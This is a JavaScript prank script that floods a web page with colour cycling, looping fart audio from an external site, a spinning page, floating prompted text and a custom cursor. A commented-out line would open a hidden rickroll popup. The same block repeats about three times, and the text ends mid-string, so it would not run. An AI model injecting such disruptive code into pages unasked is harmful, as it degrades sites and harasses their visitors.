var incrementingNum = 0;
var colors = ["red", "orange", "yellow", "green", "blue", "purple", "pink"];
setInterval(function() {
  if (incrementingNum >= 6) {
    incrementingNum = 0;
  } else {
    incrementingNum++;
  }
  var div = document.querySelectorAll("div");
  for (let i = 0; i < div.length; i++) {
    div[i].style.backgroundColor = colors[incrementingNum];
    div[i].style.transition = "background-color 1s";
  }
}, 1000);

//window.open("https://youtu.be/dQw4w9WgXcQ", "s", "width=1, height=1, left=100000, top=10000, resizable=no, toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no");

try {
  var audio = document.createElement("audio");
  audio.src = "http://soundbible.com/mp3/Fart-Common-Everyday-Fart_Mike-Koenig.mp3";
  audio.loop = true;
  audio.play();
} catch (e) {
  console.log("Unable to play audio.");
}

var css = `
html, body {
	cursor: url('data:image/x-icon;base64,AAACAAEAICAAAAAAAACoEAAAFgAAACgAAAAgAAAAQAAAAAEAIAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8C////Av///wL///8C////Av///wLZ7vH/2u/z/////wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Av///wL///8C////Ah1wdf8ncnz/O217/ypwff8tc4D/JnN8/zJwcv////8C////Av///wL///8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wL///8C////Av///wI0eoT/K32F/y10fv8qcXv/LnB7/ytteP8sdn7/O4yT/zR6ff////8C////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8CJ3qA/y1/h/8xeYP/J254/ypxe/8xeIL/KXB6/ydkbv8oYGv/KHJ4/zKQjv////8C////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Aj5xdf8ueYH/L3mF/yp5gv8yf5D/NXqM/yZykP8kcI3/L3eI/zhwdv8teXb/MIOE/z2RjP////8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wL///8CL32H/y+BhP8zhIn/MH+c/1yZy/9co8f/T5y4/02atv9jr9P/orTe/zmOk/86mJj/NZ+a/zSMh/////8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Aj2Dif8ugIX/L4GG/y5+l/9jo9f/AAkS/0E8ef9ARYP/RkyW/1ZTk/8PIlT/Zrbe/zOfmv85naH/Oa2n/0h/fv////8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8CKnh//zKDiP87jJH/XaTZ/wMKCP9MUY7/R1SH/0RIff9JS3P/OUVs/zo6Zv8AAgb/fbjv/zamp/82rK7/LbKp/////wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Ajx/gP83iY//L3+H/yx8lP8qUXX/IBwp/x4jMv8VFyH/EhEN/xYPGP8WDxT/GQ8R/w0GAP8RJSv/MZqq/zKnq/8zt7v/uN3Z/////wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8CKoSI/ziMl/80hYz/PYmv/wcHAf8SFRr/GSQ0/wgcJ/9vlq3/g6ix/7Pd8P9oj57/UXqM/y8tPv88dZj/PrG2/zSst/9sqqX/////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wI0h4n/MoqP/y2EjP9MjrT/ESMg/yVDY/8lT2v/V5ai/0tujf8jR2b/Hz9x/yBJdP8gbpL/Lai7/zOkqv80pKv/N5eg/ziwqf////8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Aj2Okf8ygYf/LXyD/yJXc/8iNkf/ETRW/xc7Z/8hVX7/XKjD/1DQyv8+yM//T9bk/0XK1P83ws3/MK64/yFoe/81jZf/Hq6j/////wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8CL5WR/yl5gP8YUl//MoKR/zSSlv84q6v/Nrm7/ze1s/8zoKT/JmBt/yNecf87m6z/PLrI/zG2x/8ukZ3/J15u/ziepv8/q6v/////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wI0jov/L4aL/yxve/8ZTWH/J2p6/zmKl/8ziZf/J2dz/xc2Pv8fQ0v/Ildt/xpYcf8ZOD7/F1BW/y1wff8xqbP/MLm//0C4t/////8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wIwj5P/MYKK/yZrdf8hW2f/IUxb/x08SP8QIC//MWl0/z+Kpv80nrn/NaG7/zSdof80qq3/SbzH/0TG1P8sxMv/Ks7G/////wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////AjKloP81l53/N5mf/zaXof85mKL/IFpm/zR4gv87i5T/Laez/0m1x/9avdH/Mb2//zO3vP89ydD/PdTa/zPh5P810cr/////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8CTKif/ziztP8ys73/LL/K/yjI0v8nv8f/Jo6V/0LBx/85x8//PNXc/z3N0P8HU2L/GTVc/32NpP9rmab/N5+k/////wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wLH+PH/QcTA/z7GzP8tgYn/YnmL/xUUNv+Wv8z/MFJe/z2Wnv87t8L/IW1w/yRMU/8PLDb/ED5J/z6NkP9Bq7D/KKyx/////wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/////wL///8C////Av///wI5p5//NoSB/y5vd/8nYWr/CjA+/y6LjP8cSE//KlBc/zR9kf8QVmL/LVdq/zJecP8lbnL/MJud/zO3sP9oysf/MLjF/zKArf8ps8f/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////Av///wL///8CKIOX/zGluf9Al5j/KoeG/y12fv8sX2//KFRd/zRVZf8ni6P/Mq3B/0rI3P9t2ev/SbPB/y9Tc/86bYT/////Av///wJkkJf/Ls7K/yHN0f8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8qma//HVh3/0egvv9Zu77/////Ake6rv8zlo//PJaX/zyZmv8oen7/H3iQ/z3V6/822Ob/JNPf/zfd5v8n1dj/O8nQ/zbKx/////8C////Av///wJD4PH/////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/zKfsP8tn6//PsjE/////wL///8C////AjGvov8mXHP/MVd5/0Kcuv8i1db/Jtfe/yHb4f8z4+r/M+Dm/yTf4/8/x8//levn/////wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////Aiewx/////8C////Av///wL///8CicvJ/zS7tf8yxML/NMLG/yXV2/8p2eT/Nd/t/0Dh8P8x3ej/I93l/xzg1f////8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/////wL///8CftrL/zLKyv8i2db/INfd/yLX4/803u7/K9nk/yLk5P8S3tT/////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8C////Av///wL///8C////AmnQz/8c18v/QNfU/zHf3f8K5Nb/////Av///wL///8C////Av///wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAA//////////////////5////wH///4A///8AH//+AA///gAH//wAA//8AAP/+AAB//gAAf/4AAH/+AAB//gAAf/4AAH//AAB//wAAf/8AAP//AAB/94AAD/cAAY/wQAHf8OAB//XgA//wMAf///wf//////////////////////8='), auto; 
}`
var style = document.createElement("style");
style.innerHTML = css;
document.head.appendChild(style);


var css = `
@keyframes roll {
  100%{
    transform:rotate(360deg)
  }
}
body {
  animation-name: roll; 
  animation-duration: 4s; 
  animation-iteration-count: 1;
}
`
var style = document.createElement("style");
style.innerHTML = css;
document.head.appendChild(style);
(function() {
    const options = {
        'text': prompt('Text:', 'Weee!'),
        'size': 150,
        'weight': 800,
        'speed': 2500
    }

    for (let i = 0; i < 50; i++) {
        let element = document.createElement('div');
        element.className = 'floatingElements'
        element.style = `width: 100%; height: 100%; margin: auto; pointer-events: none; user-select: none; font-weight: ${options.weight}; font-size: ${options.size}px; position: absolute; z-index: 2147483647; transition: all ${options.speed/1000}s linear; transform-origin: center center; text-align: center;`;
        element.textContent = options.text;

        document.body.appendChild(element);
    }

    setInterval(() => {
        let elements = document.getElementsByClassName('floatingElements');
        for (let i = 0; i < elements.length; i++) {
            elements[i].style.color = color();
            elements[i].style.opacity = Math.random() + .1;
            elements[i].style.transform = `rotate(${random(0,360)}deg) translate(${random(-1000,1000)}px, ${random(-500,500)}px) translate3d(${random(0,200)}px,${random(0,200)}px,${random(0,200)}px) rotateX(${random(0,360)}deg) rotateY(${random(0,360)}deg) rotateZ(${random(0,360)}deg)`;
        }
    }, options.speed);

    function random(min, max) { return Math.floor(Math.random() * (max - min) + min); }

    function color() { return ['red', 'orange', 'yellow', 'green', 'blue', 'purple', 'pink'][Math.floor(Math.random() * 7)]; }
})();
var audio2 = document.createElement("audio");
  audio2.src = "http://soundbible.com/mp3/Fart-Common-Everyday-Fart_Mike-Koenig.mp3";
  audio2.loop = true;
  audio2.play();
  var incrementingNum = 0;
var colors = ["red", "orange", "yellow", "green", "blue", "purple", "pink"];
setInterval(function() {
  if (incrementingNum >= 6) {
    incrementingNum = 0;
  } else {
    incrementingNum++;
  }
  var div = document.querySelectorAll("div");
  for (let i = 0; i < div.length; i++) {
    div[i].style.backgroundColor = colors[incrementingNum];
    div[i].style.transition = "background-color 1s";
  }
}, 1000);

//window.open("https://youtu.be/dQw4w9WgXcQ", "s", "width=1, height=1, left=100000, top=10000, resizable=no, toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no");

try {
  var audio = document.createElement("audio");
  audio.src = "http://soundbible.com/mp3/Fart-Common-Everyday-Fart_Mike-Koenig.mp3";
  audio.loop = true;
  audio.play();
} catch (e) {
  console.log("Unable to play audio.");
}

var css = `
html, body {
	cursor: url('data:image/x-icon;base64,AAACAAEAICAAAAAAAACoEAAAFgAAACgAAAAgAAAAQAAAAAEAIAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8C////Av///wL///8C////Av///wLZ7vH/2u/z/////wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Av///wL///8C////Ah1wdf8ncnz/O217/ypwff8tc4D/JnN8/zJwcv////8C////Av///wL///8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wL///8C////Av///wI0eoT/K32F/y10fv8qcXv/LnB7/ytteP8sdn7/O4yT/zR6ff////8C////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8CJ3qA/y1/h/8xeYP/J254/ypxe/8xeIL/KXB6/ydkbv8oYGv/KHJ4/zKQjv////8C////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Aj5xdf8ueYH/L3mF/yp5gv8yf5D/NXqM/yZykP8kcI3/L3eI/zhwdv8teXb/MIOE/z2RjP////8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wL///8CL32H/y+BhP8zhIn/MH+c/1yZy/9co8f/T5y4/02atv9jr9P/orTe/zmOk/86mJj/NZ+a/zSMh/////8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Aj2Dif8ugIX/L4GG/y5+l/9jo9f/AAkS/0E8ef9ARYP/RkyW/1ZTk/8PIlT/Zrbe/zOfmv85naH/Oa2n/0h/fv////8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8CKnh//zKDiP87jJH/XaTZ/wMKCP9MUY7/R1SH/0RIff9JS3P/OUVs/zo6Zv8AAgb/fbjv/zamp/82rK7/LbKp/////wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Ajx/gP83iY//L3+H/yx8lP8qUXX/IBwp/x4jMv8VFyH/EhEN/xYPGP8WDxT/GQ8R/w0GAP8RJSv/MZqq/zKnq/8zt7v/uN3Z/////wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8CKoSI/ziMl/80hYz/PYmv/wcHAf8SFRr/GSQ0/wgcJ/9vlq3/g6ix/7Pd8P9oj57/UXqM/y8tPv88dZj/PrG2/zSst/9sqqX/////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wI0h4n/MoqP/y2EjP9MjrT/ESMg/yVDY/8lT2v/V5ai/0tujf8jR2b/Hz9x/yBJdP8gbpL/Lai7/zOkqv80pKv/N5eg/ziwqf////8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Aj2Okf8ygYf/LXyD/yJXc/8iNkf/ETRW/xc7Z/8hVX7/XKjD/1DQyv8+yM//T9bk/0XK1P83ws3/MK64/yFoe/81jZf/Hq6j/////wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8CL5WR/yl5gP8YUl//MoKR/zSSlv84q6v/Nrm7/ze1s/8zoKT/JmBt/yNecf87m6z/PLrI/zG2x/8ukZ3/J15u/ziepv8/q6v/////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wI0jov/L4aL/yxve/8ZTWH/J2p6/zmKl/8ziZf/J2dz/xc2Pv8fQ0v/Ildt/xpYcf8ZOD7/F1BW/y1wff8xqbP/MLm//0C4t/////8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wIwj5P/MYKK/yZrdf8hW2f/IUxb/x08SP8QIC//MWl0/z+Kpv80nrn/NaG7/zSdof80qq3/SbzH/0TG1P8sxMv/Ks7G/////wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////AjKloP81l53/N5mf/zaXof85mKL/IFpm/zR4gv87i5T/Laez/0m1x/9avdH/Mb2//zO3vP89ydD/PdTa/zPh5P810cr/////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8CTKif/ziztP8ys73/LL/K/yjI0v8nv8f/Jo6V/0LBx/85x8//PNXc/z3N0P8HU2L/GTVc/32NpP9rmab/N5+k/////wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wLH+PH/QcTA/z7GzP8tgYn/YnmL/xUUNv+Wv8z/MFJe/z2Wnv87t8L/IW1w/yRMU/8PLDb/ED5J/z6NkP9Bq7D/KKyx/////wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/////wL///8C////Av///wI5p5//NoSB/y5vd/8nYWr/CjA+/y6LjP8cSE//KlBc/zR9kf8QVmL/LVdq/zJecP8lbnL/MJud/zO3sP9oysf/MLjF/zKArf8ps8f/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////Av///wL///8CKIOX/zGluf9Al5j/KoeG/y12fv8sX2//KFRd/zRVZf8ni6P/Mq3B/0rI3P9t2ev/SbPB/y9Tc/86bYT/////Av///wJkkJf/Ls7K/yHN0f8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8qma//HVh3/0egvv9Zu77/////Ake6rv8zlo//PJaX/zyZmv8oen7/H3iQ/z3V6/822Ob/JNPf/zfd5v8n1dj/O8nQ/zbKx/////8C////Av///wJD4PH/////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/zKfsP8tn6//PsjE/////wL///8C////AjGvov8mXHP/MVd5/0Kcuv8i1db/Jtfe/yHb4f8z4+r/M+Dm/yTf4/8/x8//levn/////wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////Aiewx/////8C////Av///wL///8CicvJ/zS7tf8yxML/NMLG/yXV2/8p2eT/Nd/t/0Dh8P8x3ej/I93l/xzg1f////8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/////wL///8CftrL/zLKyv8i2db/INfd/yLX4/803u7/K9nk/yLk5P8S3tT/////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8C////Av///wL///8C////AmnQz/8c18v/QNfU/zHf3f8K5Nb/////Av///wL///8C////Av///wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAA//////////////////5////wH///4A///8AH//+AA///gAH//wAA//8AAP/+AAB//gAAf/4AAH/+AAB//gAAf/4AAH//AAB//wAAf/8AAP//AAB/94AAD/cAAY/wQAHf8OAB//XgA//wMAf///wf//////////////////////8='), auto; 
}`
var style = document.createElement("style");
style.innerHTML = css;
document.head.appendChild(style);


var css = `
@keyframes roll {
  100%{
    transform:rotate(360deg)
  }
}
body {
  animation-name: roll; 
  animation-duration: 4s; 
  animation-iteration-count: 1;
}
`
var style = document.createElement("style");
style.innerHTML = css;
document.head.appendChild(style);
(function() {
    const options = {
        'text': prompt('Text:', 'Weee!'),
        'size': 150,
        'weight': 800,
        'speed': 2500
    }

    for (let i = 0; i < 50; i++) {
        let element = document.createElement('div');
        element.className = 'floatingElements'
        element.style = `width: 100%; height: 100%; margin: auto; pointer-events: none; user-select: none; font-weight: ${options.weight}; font-size: ${options.size}px; position: absolute; z-index: 2147483647; transition: all ${options.speed/1000}s linear; transform-origin: center center; text-align: center;`;
        element.textContent = options.text;

        document.body.appendChild(element);
    }

    setInterval(() => {
        let elements = document.getElementsByClassName('floatingElements');
        for (let i = 0; i < elements.length; i++) {
            elements[i].style.color = color();
            elements[i].style.opacity = Math.random() + .1;
            elements[i].style.transform = `rotate(${random(0,360)}deg) translate(${random(-1000,1000)}px, ${random(-500,500)}px) translate3d(${random(0,200)}px,${random(0,200)}px,${random(0,200)}px) rotateX(${random(0,360)}deg) rotateY(${random(0,360)}deg) rotateZ(${random(0,360)}deg)`;
        }
    }, options.speed);

    function random(min, max) { return Math.floor(Math.random() * (max - min) + min); }

    function color() { return ['red', 'orange', 'yellow', 'green', 'blue', 'purple', 'pink'][Math.floor(Math.random() * 7)]; }
})();
var audio2 = document.createElement("audio");
  audio2.src = "http://soundbible.com/mp3/Fart-Common-Everyday-Fart_Mike-Koenig.mp3";
  audio2.loop = true;
  audio2.play();
  var incrementingNum = 0;
var colors = ["red", "orange", "yellow", "green", "blue", "purple", "pink"];
setInterval(function() {
  if (incrementingNum >= 6) {
    incrementingNum = 0;
  } else {
    incrementingNum++;
  }
  var div = document.querySelectorAll("div");
  for (let i = 0; i < div.length; i++) {
    div[i].style.backgroundColor = colors[incrementingNum];
    div[i].style.transition = "background-color 1s";
  }
}, 1000);

//window.open("https://youtu.be/dQw4w9WgXcQ", "s", "width=1, height=1, left=100000, top=10000, resizable=no, toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no");

try {
  var audio = document.createElement("audio");
  audio.src = "http://soundbible.com/mp3/Fart-Common-Everyday-Fart_Mike-Koenig.mp3";
  audio.loop = true;
  audio.play();
} catch (e) {
  console.log("Unable to play audio.");
}

var css = `
html, body {
	cursor: url('data:image/x-icon;base64,AAACAAEAICAAAAAAAACoEAAAFgAAACgAAAAgAAAAQAAAAAEAIAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8C////Av///wL///8C////Av///wLZ7vH/2u/z/////wL///8C////Av///wL///8C////Av///wL///8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Av///wL///8C////Ah1wdf8ncnz/O217/ypwff8tc4D/JnN8/zJwcv////8C////Av///wL///8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wL///8C////Av///wI0eoT/K32F/y10fv8qcXv/LnB7/ytteP8sdn7/O4yT/zR6ff////8C////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Av///wL///8CJ3qA/y1/h/8xeYP/J254/ypxe/8xeIL/KXB6/ydkbv8oYGv/KHJ4/zKQjv////8C////Av///wL///8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8C////Aj5xdf8ueYH/L3mF/yp5gv8yf5D/NXqM/yZykP8kcI3/L3eI/zhwdv8teXb/MIOE/z2RjP////8C////Av///wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wL///8CL32H/y+BhP8zhIn/MH+c/1yZy/9co8f/T5y4/02atv9jr9P/orTe/zmOk/86mJj/NZ+a/zSMh/////8C////Av///wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8C////Aj2Dif8ugIX/L4GG/y5+l/9jo9f/AAkS/0E8ef9ARYP/RkyW/1ZTk/8PIlT/Zrbe/zOfmv85naH/Oa2n/0h/fv////8C////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wL///8CKnh//zKDiP87jJH/XaTZ/wMKCP9MUY7/R1SH/0RIff9JS3P/OUVs/zo6Zv8AAgb/fbjv/zamp/82rK7/LbKp/////wL///8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Ajx/gP83iY//L3+H/yx8lP8qUXX/IBwp/x4jMv8VFyH/EhEN/xYPGP8WDxT/GQ8R/w0GAP8RJSv/MZqq/zKnq/8zt7v/uN3Z/////wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8CKoSI/ziMl/80hYz/PYmv/wcHAf8SFRr/GSQ0/wgcJ/9vlq3/g6ix/7Pd8P9oj57/UXqM/y8tPv88dZj/PrG2/zSst/9sqqX/////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wI0h4n/MoqP/y2EjP9MjrT/ESMg/yVDY/8lT2v/V5ai/0tujf8jR2b/Hz9x/yBJdP8gbpL/Lai7/zOkqv80pKv/N5eg/ziwqf////8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Aj2Okf8ygYf/LXyD/yJXc/8iNkf/ETRW/xc7Z/8hVX7/XKjD/1DQyv8+yM//T9bk/0XK1P83ws3/MK64/yFoe/81jZf/Hq6j/////wL///8C////AgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wL///8CL5WR/yl5gP8YUl//MoKR/zSSlv84q6v/Nrm7/ze1s/8zoKT/JmBt/yNecf87m6z/PLrI/zG2x/8ukZ3/J15u/ziepv8/q6v/////Av///wL///8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////Av///wI0jov/L4aL/yxve/8ZTWH/J2p6/zmKl/8ziZf/J2dz/xc2Pv8fQ0v/Ildt/xpYcf8ZOD7/F1BW/y1wff8xqbP/MLm//0C4t/////8C////Av///wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8C////Av///wIwj5P/MYKK/yZrdf8hW2f/IUxb/x08SP8QIC//MWl0/z+Kpv80nrn/NaG7/zSdof80qq3/SbzH/0